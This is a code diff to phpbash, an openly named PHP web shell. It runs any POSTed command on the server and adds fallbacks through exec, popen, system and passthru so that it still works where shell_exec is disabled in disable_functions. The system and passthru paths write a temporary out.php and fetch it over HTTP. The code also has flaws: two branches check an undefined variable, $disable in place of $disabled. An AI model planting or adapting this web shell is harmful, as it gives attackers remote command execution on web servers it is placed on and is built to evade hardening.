@@ -1,7 +1,37 @@
 <?php
 /* phpbash by Alexander Reid (Arrexel) */
 if (ISSET($_POST['cmd'])) {
-    $output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
+	$disabled=explode(',',ini_get('disable_functions'));
+	$disabled=array_map("trim",$disabled);
+	$output=[];
+	if(!in_array('shell_exec',$disabled)){
+		$output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
+	}
+	else if(!in_array('exec',$disabled)){
+		exec($_POST['cmd']." 2>&1",$output);
+	}
+	else if(!in_array('popen',$disabled)){
+		$fp=popen($_POST['cmd'].' 2>&1','r');
+		$ans="";
+		while(!feof($fp)){
+			$ans=$ans.fread($fp,1024);
+		}
+		$output=preg_split('/[\n]/',$ans);
+
+	}
+	else if(!in_array('system',$disable)){
+        file_put_contents(__DIR__.'/out.php',"<?php system('".addslashes($_POST['cmd'])." 2>&1');");
+        $data=file_get_contents((((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://').dirname($_SERVER['SERVER_NAME'].$_SERVER["REQUEST_URI"]).'/out.php');        
+		@unlink(__DIR__.'/out.php');
+		$output=preg_split('/[\n]/',$data);
+	}
+	else if(!in_array('passthru',$disable)){
+        file_put_contents(__DIR__.'/out.php',"<?php passthru('".addslashes($_POST['cmd'])." 2>&1');");
+        $data=file_get_contents((((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://').dirname($_SERVER['SERVER_NAME'].$_SERVER["REQUEST_URI"]).'/out.php');
+        @unlink(__DIR__.'/out.php');
+        $output=preg_split('/[\n]/',$data);
+	}
+	else $output='';
     foreach ($output as $line) {
         echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8')."<br>";
     }
